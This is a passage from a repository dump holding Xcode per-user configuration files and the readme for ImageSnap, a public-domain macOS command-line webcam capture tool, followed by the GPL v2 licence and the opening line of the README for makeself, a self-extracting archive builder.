					<key>Dock</key>
					<array>
						<dict>
							<key>BecomeActive</key>
							<integer>1</integer>
							<key>GeometryConfiguration</key>
							<dict>
								<key>Frame</key>
								<string>{0, 0}, {500, 335}</string>
								<key>RubberWindowFrame</key>
								<string>{0, 0}, {500, 335}</string>
							</dict>
							<key>Module</key>
							<string>XCRefactoringModule</string>
							<key>Proportion</key>
							<string>100%</string>
						</dict>
					</array>
					<key>Proportion</key>
					<string>100%</string>
				</dict>
			</array>
			<key>Name</key>
			<string>Refactoring</string>
			<key>ServiceClasses</key>
			<array>
				<string>XCRefactoringModule</string>
			</array>
			<key>WindowString</key>
			<string>200 200 500 356 0 0 1920 1200 </string>
		</dict>
	</array>
</dict>
</plist>

```

`Tools/ImageSnap-v0.2.5/ImageSnap.xcodeproj/rob.pbxuser`:

```pbxuser
// !$*UTF8*$!
{
	08FB7793FE84155DC02AAC07 /* Project object */ = {
		activeBuildConfigurationName = Debug;
		activeExecutable = D481729D105D8C9F00C394D7 /* imagesnap */;
		activeTarget = 8DD76F740486A8DE00D96B5E /* imagesnap */;
		addToTargets = (
			8DD76F740486A8DE00D96B5E /* imagesnap */,
		);
		breakpoints = (
			D4FE0444105E9A9A002E9390 /* ImageSnap.m:375 */,
			D49AA9531084FD4200FE189B /* ImageSnap.m:120 */,
		);
		codeSenseManager = D48172AB105D8CB100C394D7 /* Code sense */;
		executables = (
			D481729D105D8C9F00C394D7 /* imagesnap */,
		);
		perUserDictionary = {
			PBXConfiguration.PBXFileTableDataSource3.PBXFileTableDataSource = {
				PBXFileTableDataSourceColumnSortingDirectionKey = "-1";
				PBXFileTableDataSourceColumnSortingKey = PBXFileDataSource_Filename_ColumnID;
				PBXFileTableDataSourceColumnWidthsKey = (
					20,
					503,
					20,
					48,
					43,
					43,
					20,
				);
				PBXFileTableDataSourceColumnsKey = (
					PBXFileDataSource_FiletypeID,
					PBXFileDataSource_Filename_ColumnID,
					PBXFileDataSource_Built_ColumnID,
					PBXFileDataSource_ObjectSize_ColumnID,
					PBXFileDataSource_Errors_ColumnID,
					PBXFileDataSource_Warnings_ColumnID,
					PBXFileDataSource_Target_ColumnID,
				);
			};
			PBXConfiguration.PBXTargetDataSource.PBXTargetDataSource = {
				PBXFileTableDataSourceColumnSortingDirectionKey = "-1";
				PBXFileTableDataSourceColumnSortingKey = PBXFileDataSource_Filename_ColumnID;
				PBXFileTableDataSourceColumnWidthsKey = (
					20,
					463,
					60,
					20,
					48,
					43,
					43,
				);
				PBXFileTableDataSourceColumnsKey = (
					PBXFileDataSource_FiletypeID,
					PBXFileDataSource_Filename_ColumnID,
					PBXTargetDataSource_PrimaryAttribute,
					PBXFileDataSource_Built_ColumnID,
					PBXFileDataSource_ObjectSize_ColumnID,
					PBXFileDataSource_Errors_ColumnID,
					PBXFileDataSource_Warnings_ColumnID,
				);
			};
			PBXPerProjectTemplateStateSaveDate = 316505816;
			PBXWorkspaceStateSaveDate = 316505816;
		};
		perUserProjectItems = {
			D48172E1105D96D400C394D7 /* PBXTextBookmark */ = D48172E1105D96D400C394D7 /* PBXTextBookmark */;
			D4AB72991091106400FB6451 /* PBXTextBookmark */ = D4AB72991091106400FB6451 /* PBXTextBookmark */;
			D4FBB0DC12DE696800E74B2C /* PBXTextBookmark */ = D4FBB0DC12DE696800E74B2C /* PBXTextBookmark */;
			D4FBB0DD12DE696800E74B2C /* PBXTextBookmark */ = D4FBB0DD12DE696800E74B2C /* PBXTextBookmark */;
			D4FBB0FC12DED47300E74B2C /* PBXTextBookmark */ = D4FBB0FC12DED47300E74B2C /* PBXTextBookmark */;
		};
		sourceControlManager = D48172AA105D8CB100C394D7 /* Source Control */;
		userBuildSettings = {
		};
	};
	8DD76F740486A8DE00D96B5E /* imagesnap */ = {
		activeExec = 0;
		executables = (
			D481729D105D8C9F00C394D7 /* imagesnap */,
		);
	};
	D44480A5105BFF5600756CA8 /* ImageSnap.h */ = {
		uiCtxt = {
			sepNavIntBoundsRect = "{{0, 0}, {681, 1066}}";
			sepNavSelRange = "{255, 0}";
			sepNavVisRange = "{0, 877}";
			sepNavWindowFrame = "{{76, 105}, {1057, 768}}";
		};
	};
	D44480A6105BFF5600756CA8 /* ImageSnap.m */ = {
		uiCtxt = {
			sepNavIntBoundsRect = "{{0, 0}, {733, 6981}}";
			sepNavSelRange = "{6501, 0}";
			sepNavVisRange = "{6405, 407}";
			sepNavWindowFrame = "{{99, 84}, {1057, 768}}";
		};
	};
	D481729D105D8C9F00C394D7 /* imagesnap */ = {
		isa = PBXExecutable;
		activeArgIndices = (
		);
		argumentStrings = (
		);
		autoAttachOnCrash = 1;
		breakpointsEnabled = 0;
		configStateDict = {
		};
		customDataFormattersEnabled = 1;
		dataTipCustomDataFormattersEnabled = 1;
		dataTipShowTypeColumn = 1;
		dataTipSortType = 0;
		debuggerPlugin = GDBDebugging;
		disassemblyDisplayState = 0;
		dylibVariantSuffix = "";
		enableDebugStr = 1;
		environmentEntries = (
		);
		executableSystemSymbolLevel = 0;
		executableUserSymbolLevel = 0;
		libgmallocEnabled = 0;
		name = imagesnap;
		savedGlobals = {
		};
		showTypeColumn = 0;
		sourceDirectories = (
		);
		variableFormatDictionary = {
		};
	};
	D48172AA105D8CB100C394D7 /* Source Control */ = {
		isa = PBXSourceControlManager;
		fallbackIsa = XCSourceControlManager;
		isSCMEnabled = 0;
		scmConfiguration = {
			repositoryNamesForRoots = {
				"" = iHarder.net;
			};
		};
	};
	D48172AB105D8CB100C394D7 /* Code sense */ = {
		isa = PBXCodeSenseManager;
		indexTemplatePath = "";
	};
	D48172CD105D96C900C394D7 /* NSData.h */ = {
		isa = PBXFileReference;
		lastKnownFileType = sourcecode.c.h;
		name = NSData.h;
		path = /Developer/SDKs/MacOSX10.5.sdk/System/Library/Frameworks/Foundation.framework/Versions/C/Headers/NSData.h;
		sourceTree = "<absolute>";
	};
	D48172E1105D96D400C394D7 /* PBXTextBookmark */ = {
		isa = PBXTextBookmark;
		fRef = D48172CD105D96C900C394D7 /* NSData.h */;
		name = "NSData.h: 91";
		rLen = 0;
		rLoc = 3258;
		rType = 0;
		vrLen = 1149;
		vrLoc = 2859;
	};
	D49AA9531084FD4200FE189B /* ImageSnap.m:120 */ = {
		isa = PBXFileBreakpoint;
		actions = (
		);
		breakpointStyle = 0;
		continueAfterActions = 0;
		countType = 0;
		delayBeforeContinue = 0;
		fileReference = D44480A6105BFF5600756CA8 /* ImageSnap.m */;
		functionName = "+dataFrom:asType:";
		hitCount = 1;
		ignoreCount = 0;
		lineNumber = 120;
		location = imagesnap;
		modificationTime = 277151252.786813;
		originalNumberOfMultipleMatches = 1;
		state = 1;
	};
	D49AA9851085011600FE189B /* ReadMeOrDont.rtf */ = {
		uiCtxt = {
			sepNavIntBoundsRect = "{{0, 0}, {695, 1462}}";
			sepNavSelRange = "{1386, 0}";
			sepNavVisRect = "{{0, 980}, {695, 482}}";
		};
	};
	D4AB72991091106400FB6451 /* PBXTextBookmark */ = {
		isa = PBXTextBookmark;
		fRef = D49AA9851085011600FE189B /* ReadMeOrDont.rtf */;
		name = "ReadMeOrDont.rtf: 38";
		rLen = 0;
		rLoc = 1386;
		rType = 0;
		vrLen = 992;
		vrLoc = 1145;
	};
	D4FBB0DC12DE696800E74B2C /* PBXTextBookmark */ = {
		isa = PBXTextBookmark;
		fRef = D44480A5105BFF5600756CA8 /* ImageSnap.h */;
		name = "ImageSnap.h: 13";
		rLen = 0;
		rLoc = 255;
		rType = 0;
		vrLen = 877;
		vrLoc = 0;
	};
	D4FBB0DD12DE696800E74B2C /* PBXTextBookmark */ = {
		isa = PBXTextBookmark;
		fRef = D44480A6105BFF5600756CA8 /* ImageSnap.m */;
		name = "ImageSnap.m: 13";
		rLen = 0;
		rLoc = 129;
		rType = 0;
		vrLen = 565;
		vrLoc = 0;
	};
	D4FBB0FC12DED47300E74B2C /* PBXTextBookmark */ = {
		isa = PBXTextBookmark;
		fRef = D44480A6105BFF5600756CA8 /* ImageSnap.m */;
		name = "ImageSnap.m: 212";
		rLen = 0;
		rLoc = 6501;
		rType = 0;
		vrLen = 407;
		vrLoc = 6405;
	};
	D4FE0444105E9A9A002E9390 /* ImageSnap.m:375 */ = {
		isa = PBXFileBreakpoint;
		actions = (
		);
		breakpointStyle = 0;
		continueAfterActions = 0;
		countType = 0;
		delayBeforeContinue = 0;
		fileReference = D44480A6105BFF5600756CA8 /* ImageSnap.m */;
		functionName = "main()";
		hitCount = 0;
		ignoreCount = 0;
		lineNumber = 375;
		modificationTime = 277151246.257065;
		originalNumberOfMultipleMatches = 0;
		state = 2;
	};
}

```

`Tools/ImageSnap-v0.2.5/ImageSnap.xcodeproj/xcuserdata/rob.xcuserdatad/xcdebugger/Breakpoints.xcbkptlist`:

```xcbkptlist
<?xml version="1.0" encoding="UTF-8"?>
<Bucket
   type = "1"
   version = "1.0">
   <FileBreakpoints>
      <FileBreakpoint
         shouldBeEnabled = "No"
         ignoreCount = "0"
         continueAfterRunningActions = "No"
         isPathRelative = "1"
         filePath = "ImageSnap.m"
         timestampString = "335462665.561719"
         startingColumnNumber = "9223372036854775807"
         endingColumnNumber = "9223372036854775807"
         startingLineNumber = "416"
         endingLineNumber = "416"
         landmarkName = "-captureOutput:didOutputVideoFrame:withSampleBuffer:fromConnection:"
         landmarkType = "5">
      </FileBreakpoint>
      <FileBreakpoint
         shouldBeEnabled = "Yes"
         ignoreCount = "0"
         continueAfterRunningActions = "No"
         isPathRelative = "1"
         filePath = "ImageSnap.m"
         timestampString = "277151252.786813"
         startingColumnNumber = "9223372036854775807"
         endingColumnNumber = "9223372036854775807"
         startingLineNumber = "120"
         endingLineNumber = "120"
         landmarkName = "+dataFrom:asType:"
         landmarkType = "5">
      </FileBreakpoint>
   </FileBreakpoints>
</Bucket>

```

`Tools/ImageSnap-v0.2.5/ImageSnap.xcodeproj/xcuserdata/rob.xcuserdatad/xcschemes/imagesnap.xcscheme`:

```xcscheme
<?xml version="1.0" encoding="UTF-8"?>
<Scheme
   version = "1.8">
   <BuildAction
      parallelizeBuildables = "YES"
      buildImplicitDependencies = "YES">
      <BuildActionEntries>
         <BuildActionEntry
            buildForTesting = "YES"
            buildForRunning = "YES"
            buildForProfiling = "YES"
            buildForArchiving = "YES"
            buildForAnalyzing = "YES">
            <BuildableReference
               BuildableIdentifier = "primary"
               BlueprintIdentifier = "8DD76F740486A8DE00D96B5E"
               BuildableName = "imagesnap"
               BlueprintName = "imagesnap"
               ReferencedContainer = "container:ImageSnap.xcodeproj">
            </BuildableReference>
         </BuildActionEntry>
      </BuildActionEntries>
   </BuildAction>
   <TestAction
      selectedDebuggerIdentifier = "Xcode.DebuggerFoundation.Debugger.GDB"
      selectedLauncherIdentifier = "Xcode.DebuggerFoundation.Launcher.GDB"
      shouldUseLaunchSchemeArgsEnv = "YES"
      buildConfiguration = "Debug">
      <Testables>
      </Testables>
   </TestAction>
   <LaunchAction
      selectedDebuggerIdentifier = "Xcode.DebuggerFoundation.Debugger.GDB"
      selectedLauncherIdentifier = "Xcode.DebuggerFoundation.Launcher.GDB"
      displayScaleIsEnabled = "NO"
      displayScale = "1.00"
      launchStyle = "0"
      useCustomWorkingDirectory = "NO"
      buildConfiguration = "Debug">
      <BuildableProductRunnable>
         <BuildableReference
            BuildableIdentifier = "primary"
            BlueprintIdentifier = "8DD76F740486A8DE00D96B5E"
            BuildableName = "imagesnap"
            BlueprintName = "imagesnap"
            ReferencedContainer = "container:ImageSnap.xcodeproj">
         </BuildableReference>
      </BuildableProductRunnable>
      <CommandLineArguments>
         <CommandLineArgument
            argument = "-t"
            isEnabled = "YES">
         </CommandLineArgument>
         <CommandLineArgument
            argument = "1"
            isEnabled = "YES">
         </CommandLineArgument>
      </CommandLineArguments>
      <AdditionalOptions>
      </AdditionalOptions>
   </LaunchAction>
   <ProfileAction
      displayScaleIsEnabled = "NO"
      displayScale = "1.00"
      shouldUseLaunchSchemeArgsEnv = "YES"
      savedToolIdentifier = ""
      useCustomWorkingDirectory = "NO"
      buildConfiguration = "Release">
      <BuildableProductRunnable>
         <BuildableReference
            BuildableIdentifier = "primary"
            BlueprintIdentifier = "8DD76F740486A8DE00D96B5E"
            BuildableName = "imagesnap"
            BlueprintName = "imagesnap"
            ReferencedContainer = "container:ImageSnap.xcodeproj">
         </BuildableReference>
      </BuildableProductRunnable>
   </ProfileAction>
   <AnalyzeAction
      buildConfiguration = "Debug">
   </AnalyzeAction>
   <ArchiveAction
      buildConfiguration = "Release"
      revealArchiveInOrganizer = "YES">
   </ArchiveAction>
</Scheme>

```

`Tools/ImageSnap-v0.2.5/ImageSnap.xcodeproj/xcuserdata/rob.xcuserdatad/xcschemes/xcschememanagement.plist`:

```plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>SchemeUserState</key>
	<dict>
		<key>imagesnap.xcscheme</key>
		<dict>
			<key>orderHint</key>
			<integer>0</integer>
		</dict>
	</dict>
	<key>SuppressBuildableAutocreation</key>
	<dict>
		<key>8DD76F740486A8DE00D96B5E</key>
		<dict>
			<key>primary</key>
			<true/>
		</dict>
	</dict>
</dict>
</plist>

```

`Tools/ImageSnap-v0.2.5/ReadMeOrDont.rtf`:

```rtf
{\rtf1\ansi\ansicpg1252\cocoartf1138
{\fonttbl\f0\fnil\fcharset0 Verdana;\f1\fswiss\fcharset0 ArialMT;\f2\fmodern\fcharset0 Courier;
\f3\fmodern\fcharset0 Courier-Oblique;}
{\colortbl;\red255\green255\blue255;\red0\green16\blue81;}
{\*\listtable{\list\listtemplateid1\listhybrid{\listlevel\levelnfc23\levelnfcn23\leveljc0\leveljcn0\levelfollow0\levelstartat1\levelspace360\levelindent0{\*\levelmarker \{disc\}}{\leveltext\leveltemplateid1\'01\uc0\u8226 ;}{\levelnumbers;}\fi-360\li720\lin720 }{\listname ;}\listid1}}
{\*\listoverridetable{\listoverride\listid1\listoverridecount0\ls1}}
\margl1440\margr1440\vieww14180\viewh14480\viewkind0
\deftab720
\pard\pardeftab720

\f0\b\fs38 \cf0 \ul \ulc0 Image Snap\

\b0\fs20 \ulnone \
by Robert Harder\
rob@iHarder.net
\b\fs38 \
\
\pard\pardeftab720\sa360

\fs28 \cf0 Capture Images from the Command Line
\f1\fs32 \
\pard\pardeftab720\sa320\qc
{\field{\*\fldinst{HYPERLINK "http://iharder.net/imagesnap"}}{\fldrslt 
\f0\b0 \cf0 http://iharder.net/imagesnap}}
\f0\b0 \
\pard\pardeftab720\sa320
\cf0 ImageSnap is a Public Domain command-line tool that lets you capture still images from an iSight or other video source.\
\pard\pardeftab720\sa300

\f1\b\fs38 \cf2 Installation\
\pard\pardeftab720\sa320

\f0\b0\fs32 \cf0 Copy the 
\f2\fs26 imagesnap
\f0\fs32  file to someplace on your path like 
\f2\fs26 /usr/local/bin
\f0\fs32 , or leave it in a "current directory," and call it with 
\f2\fs26 ./imagesnap
\f0\fs32  instead.\
Enjoy!\
\pard\pardeftab720\sa300

\f1\b\fs38 \cf2 Usage\
\pard\pardeftab720\sa320

\f0\b0\fs32 \cf0 To capture an image simply run the program from the command line.\
\pard\pardeftab720

\f2\fs26 \cf0 $ imagesnap\
Capturing image from device "iSight"..................snapshot.jpg\
\pard\pardeftab720\sa320

\f0\fs32 \cf0 \
To specify a filename, make that your last argument:\
\pard\pardeftab720

\f2\fs26 \cf0 $ imagesnap icu.jpg\
Capturing image from device "iSight"..................icu.jpg\
\pard\pardeftab720\sa320

\f0\fs32 \cf0 \
If you have multiple video devices attached to your computer, use the 
\f2\fs26 -l
\f0\fs32  ("el") flag to list them:\
\pard\pardeftab720

\f2\fs26 \cf0 $ imagesnap -l\
Video Devices:\
iSight\
DV\
\pard\pardeftab720\sa320

\f0\fs32 \cf0 \
To select a specific video device use the 
\f2\fs26 -d 
\f3\i device
\f0\i0\fs32  flag:\
\pard\pardeftab720

\f2\fs26 \cf0 $ imagesnap -d DV\
Capturing image from device "DV"..................snapshot.jpg\
\pard\pardeftab720\sa320

\f0\fs32 \cf0 \
To output a jpeg representation to standard out (stdout), use a dash for the filename:\
\pard\pardeftab720

\f2\fs26 \cf0 $ ssh johndoe@somewhere.com /usr/local/bin/imagesnap - > snapshot.jpg\
$ open snapshot.jpg\
\pard\pardeftab720\sa300

\f1\b\fs38 \cf2 \
Image Formats\
\pard\pardeftab720\sa320

\f0\b0\fs32 \cf0 The following image formats are supported and are determined by the filename extension: JPEG, TIFF, PNG, GIF, BMP.\
\pard\pardeftab720\sa300

\f1\b\fs38 \cf2 Changes\
\pard\tx220\tx720\pardeftab720\li720\fi-720\sa320
\ls1\ilvl0
\f0\b0\fs32 \cf0 {\listtext	\'95	}v0.2.5 - Added option to delay the first snapshot for some time. Added a time-lapse feature (thanks, Bas Zoetekouw).\
{\listtext	\'95	}v0.2.4 - Found bug that caused crash on Mac OS X 10.5 (but not 10.6).\
{\listtext	\'95	}v0.2.4beta - Tracking bug that causes crash on Mac OS X 10.5 (but not 10.6).\
{\listtext	\'95	}v0.2.3 - Fixed bug that caused all images to be saved as TIFF. Not sure when this bug was introduced.\
{\listtext	\'95	}v0.2.2 - Added ability to output jpeg to standard out. Made executable lowercase 
\f2\fs26 imagesnap
\f0\fs32 .\
{\listtext	\'95	}v0.2.1 - Changed name from ImageCapture to ImageSnap to avoid confusion with Apple's Image Capture application.\
{\listtext	\'95	}v0.2 - Multiple file formats (not just TIFF). Faster response.\
{\listtext	\'95	}v0.1 - This is the initial release.\
\pard\pardeftab720\sa300

\f1\b\fs38 \cf2 A Note About Public Domain\
\pard\pardeftab720\sa320

\f0\b0\fs32 \cf0 I have released this software into the Public Domain. That means you can do whatever you want with it. Really. You don't have to match it up with any other open source license \'97 just use it. You can rename the files, do whatever you want. If your lawyers say you have to have a license, contact me, and I'll make a special release to you under whatever reasonable license you desire: MIT, BSD, GPL, whatever.}
```

`Tools/makeself/COPYING`:

```
                    GNU GENERAL PUBLIC LICENSE
                       Version 2, June 1991

 Copyright (C) 1989, 1991 Free Software Foundation, Inc.,
 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

                            Preamble

  The licenses for most software are designed to take away your
freedom to share and change it.  By contrast, the GNU General Public
License is intended to guarantee your freedom to share and change free
software--to make sure the software is free for all its users.  This
General Public License applies to most of the Free Software
Foundation's software and to any other program whose authors commit to
using it.  (Some other Free Software Foundation software is covered by
the GNU Lesser General Public License instead.)  You can apply it to
your programs, too.

  When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
this service if you wish), that you receive source code or can get it
if you want it, that you can change the software or use pieces of it
in new free programs; and that you know you can do these things.

  To protect your rights, we need to make restrictions that forbid
anyone to deny you these rights or to ask you to surrender the rights.
These restrictions translate to certain responsibilities for you if you
distribute copies of the software, or if you modify it.

  For example, if you distribute copies of such a program, whether
gratis or for a fee, you must give the recipients all the rights that
you have.  You must make sure that they, too, receive or can get the
source code.  And you must show them these terms so they know their
rights.

  We protect your rights with two steps: (1) copyright the software, and
(2) offer you this license which gives you legal permission to copy,
distribute and/or modify the software.

  Also, for each author's protection and ours, we want to make certain
that everyone understands that there is no warranty for this free
software.  If the software is modified by someone else and passed on, we
want its recipients to know that what they have is not the original, so
that any problems introduced by others will not reflect on the original
authors' reputations.

  Finally, any free program is threatened constantly by software
patents.  We wish to avoid the danger that redistributors of a free
program will individually obtain patent licenses, in effect making the
program proprietary.  To prevent this, we have made it clear that any
patent must be licensed for everyone's free use or not licensed at all.

  The precise terms and conditions for copying, distribution and
modification follow.

                    GNU GENERAL PUBLIC LICENSE
   TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION

  0. This License applies to any program or other work which contains
a notice placed by the copyright holder saying it may be distributed
under the terms of this General Public License.  The "Program", below,
refers to any such program or work, and a "work based on the Program"
means either the Program or any derivative work under copyright law:
that is to say, a work containing the Program or a portion of it,
either verbatim or with modifications and/or translated into another
language.  (Hereinafter, translation is included without limitation in
the term "modification".)  Each licensee is addressed as "you".

Activities other than copying, distribution and modification are not
covered by this License; they are outside its scope.  The act of
running the Program is not restricted, and the output from the Program
is covered only if its contents constitute a work based on the
Program (independent of having been made by running the Program).
Whether that is true depends on what the Program does.

  1. You may copy and distribute verbatim copies of the Program's
source code as you receive it, in any medium, provided that you
conspicuously and appropriately publish on each copy an appropriate
copyright notice and disclaimer of warranty; keep intact all the
notices that refer to this License and to the absence of any warranty;
and give any other recipients of the Program a copy of this License
along with the Program.

You may charge a fee for the physical act of transferring a copy, and
you may at your option offer warranty protection in exchange for a fee.

  2. You may modify your copy or copies of the Program or any portion
of it, thus forming a work based on the Program, and copy and
distribute such modifications or work under the terms of Section 1
above, provided that you also meet all of these conditions:

    a) You must cause the modified files to carry prominent notices
    stating that you changed the files and the date of any change.

    b) You must cause any work that you distribute or publish, that in
    whole or in part contains or is derived from the Program or any
    part thereof, to be licensed as a whole at no charge to all third
    parties under the terms of this License.

    c) If the modified program normally reads commands interactively
    when run, you must cause it, when started running for such
    interactive use in the most ordinary way, to print or display an
    announcement including an appropriate copyright notice and a
    notice that there is no warranty (or else, saying that you provide
    a warranty) and that users may redistribute the program under
    these conditions, and telling the user how to view a copy of this
    License.  (Exception: if the Program itself is interactive but
    does not normally print such an announcement, your work based on
    the Program is not required to print an announcement.)

These requirements apply to the modified work as a whole.  If
identifiable sections of that work are not derived from the Program,
and can be reasonably considered independent and separate works in
themselves, then this License, and its terms, do not apply to those
sections when you distribute them as separate works.  But when you
distribute the same sections as part of a whole which is a work based
on the Program, the distribution of the whole must be on the terms of
this License, whose permissions for other licensees extend to the
entire whole, and thus to each and every part regardless of who wrote it.

Thus, it is not the intent of this section to claim rights or contest
your rights to work written entirely by you; rather, the intent is to
exercise the right to control the distribution of derivative or
collective works based on the Program.

In addition, mere aggregation of another work not based on the Program
with the Program (or with a work based on the Program) on a volume of
a storage or distribution medium does not bring the other work under
the scope of this License.

  3. You may copy and distribute the Program (or a work based on it,
under Section 2) in object code or executable form under the terms of
Sections 1 and 2 above provided that you also do one of the following:

    a) Accompany it with the complete corresponding machine-readable
    source code, which must be distributed under the terms of Sections
    1 and 2 above on a medium customarily used for software interchange; or,

    b) Accompany it with a written offer, valid for at least three
    years, to give any third party, for a charge no more than your
    cost of physically performing source distribution, a complete
    machine-readable copy of the corresponding source code, to be
    distributed under the terms of Sections 1 and 2 above on a medium
    customarily used for software interchange; or,

    c) Accompany it with the information you received as to the offer
    to distribute corresponding source code.  (This alternative is
    allowed only for noncommercial distribution and only if you
    received the program in object code or executable form with such
    an offer, in accord with Subsection b above.)

The source code for a work means the preferred form of the work for
making modifications to it.  For an executable work, complete source
code means all the source code for all modules it contains, plus any
associated interface definition files, plus the scripts used to
control compilation and installation of the executable.  However, as a
special exception, the source code distributed need not include
anything that is normally distributed (in either source or binary
form) with the major components (compiler, kernel, and so on) of the
operating system on which the executable runs, unless that component
itself accompanies the executable.

If distribution of executable or object code is made by offering
access to copy from a designated place, then offering equivalent
access to copy the source code from the same place counts as
distribution of the source code, even though third parties are not
compelled to copy the source along with the object code.

  4. You may not copy, modify, sublicense, or distribute the Program
except as expressly provided under this License.  Any attempt
otherwise to copy, modify, sublicense or distribute the Program is
void, and will automatically terminate your rights under this License.
However, parties who have received copies, or rights, from you under
this License will not have their licenses terminated so long as such
parties remain in full compliance.

  5. You are not required to accept this License, since you have not
signed it.  However, nothing else grants you permission to modify or
distribute the Program or its derivative works.  These actions are
prohibited by law if you do not accept this License.  Therefore, by
modifying or distributing the Program (or any work based on the
Program), you indicate your acceptance of this License to do so, and
all its terms and conditions for copying, distributing or modifying
the Program or works based on it.

  6. Each time you redistribute the Program (or any work based on the
Program), the recipient automatically receives a license from the
original licensor to copy, distribute or modify the Program subject to
these terms and conditions.  You may not impose any further
restrictions on the recipients' exercise of the rights granted herein.
You are not responsible for enforcing compliance by third parties to
this License.

  7. If, as a consequence of a court judgment or allegation of patent
infringement or for any other reason (not limited to patent issues),
conditions are imposed on you (whether by court order, agreement or
otherwise) that contradict the conditions of this License, they do not
excuse you from the conditions of this License.  If you cannot
distribute so as to satisfy simultaneously your obligations under this
License and any other pertinent obligations, then as a consequence you
may not distribute the Program at all.  For example, if a patent
license would not permit royalty-free redistribution of the Program by
all those who receive copies directly or indirectly through you, then
the only way you could satisfy both it and this License would be to
refrain entirely from distribution of the Program.

If any portion of this section is held invalid or unenforceable under
any particular circumstance, the balance of the section is intended to
apply and the section as a whole is intended to apply in other
circumstances.

It is not the purpose of this section to induce you to infringe any
patents or other property right claims or to contest validity of any
such claims; this section has the sole purpose of protecting the
integrity of the free software distribution system, which is
implemented by public license practices.  Many people have made
generous contributions to the wide range of software distributed
through that system in reliance on consistent application of that
system; it is up to the author/donor to decide if he or she is willing
to distribute software through any other system and a licensee cannot
impose that choice.

This section is intended to make thoroughly clear what is believed to
be a consequence of the rest of this License.

  8. If the distribution and/or use of the Program is restricted in
certain countries either by patents or by copyrighted interfaces, the
original copyright holder who places the Program under this License
may add an explicit geographical distribution limitation excluding
those countries, so that distribution is permitted only in or among
countries not thus excluded.  In such case, this License incorporates
the limitation as if written in the body of this License.

  9. The Free Software Foundation may publish revised and/or new versions
of the General Public License from time to time.  Such new versions will
be similar in spirit to the present version, but may differ in detail to
address new problems or concerns.

Each version is given a distinguishing version number.  If the Program
specifies a version number of this License which applies to it and "any
later version", you have the option of following the terms and conditions
either of that version or of any later version published by the Free
Software Foundation.  If the Program does not specify a version number of
this License, you may choose any version ever published by the Free Software
Foundation.

  10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author
to ask for permission.  For software which is copyrighted by the Free
Software Foundation, write to the Free Software Foundation; we sometimes
make exceptions for this.  Our decision will be guided by the two goals
of preserving the free status of all derivatives of our free software and
of promoting the sharing and reuse of software generally.

                            NO WARRANTY

  11. BECAUSE THE PROGRAM IS LICENSED FREE OF CHARGE, THERE IS NO WARRANTY
FOR THE PROGRAM, TO THE EXTENT PERMITTED BY APPLICABLE LAW.  EXCEPT WHEN
OTHERWISE STATED IN WRITING THE COPYRIGHT HOLDERS AND/OR OTHER PARTIES
PROVIDE THE PROGRAM "AS IS" WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESSED
OR IMPLIED, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.  THE ENTIRE RISK AS
TO THE QUALITY AND PERFORMANCE OF THE PROGRAM IS WITH YOU.  SHOULD THE
PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF ALL NECESSARY SERVICING,
REPAIR OR CORRECTION.

  12. IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING
WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MAY MODIFY AND/OR
REDISTRIBUTE THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES,
INCLUDING ANY GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING
OUT OF THE USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED
TO LOSS OF DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY
YOU OR THIRD PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER
PROGRAMS), EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE
POSSIBILITY OF SUCH DAMAGES.

                     END OF TERMS AND CONDITIONS

            How to Apply These Terms to Your New Programs

  If you develop a new program, and you want it to be of the greatest
possible use to the public, the best way to achieve this is to make it
free software which everyone can redistribute and change under these terms.

  To do so, attach the following notices to the program.  It is safest
to attach them to the start of each source file to most effectively
convey the exclusion of warranty; and each file should have at least
the "copyright" line and a pointer to where the full notice is found.

    <one line to give the program's name and a brief idea of what it does.>
    Copyright (C) <year>  <name of author>

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License along
    with this program; if not, write to the Free Software Foundation, Inc.,
    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

Also add information on how to contact you by electronic and paper mail.

If the program is interactive, make it output a short notice like this
when it starts in an interactive mode:

    Gnomovision version 69, Copyright (C) year name of author
    Gnomovision comes with ABSOLUTELY NO WARRANTY; for details type `show w'.
    This is free software, and you are welcome to redistribute it
    under certain conditions; type `show c' for details.

The hypothetical commands `show w' and `show c' should show the appropriate
parts of the General Public License.  Of course, the commands you use may
be called something other than `show w' and `show c'; they could even be
mouse-clicks or menu items--whatever suits your program.

You should also get your employer (if you work as a programmer) or your
school, if any, to sign a "copyright disclaimer" for the program, if
necessary.  Here is a sample; alter the names:

  Yoyodyne, Inc., hereby disclaims all copyright interest in the program
  `Gnomovision' (which makes passes at compilers) written by James Hacker.

  <signature of Ty Coon>, 1 April 1989
  Ty Coon, President of Vice

This General Public License does not permit incorporating your program into
proprietary programs.  If your program is a subroutine library, you may
consider it more useful to permit linking proprietary applications with the
library.  If this is what you want to do, use the GNU Lesser General
Public License instead of this License.

```

`Tools/makeself/README.md`:

```md
# makeself - Make self-extractable archives on Unix

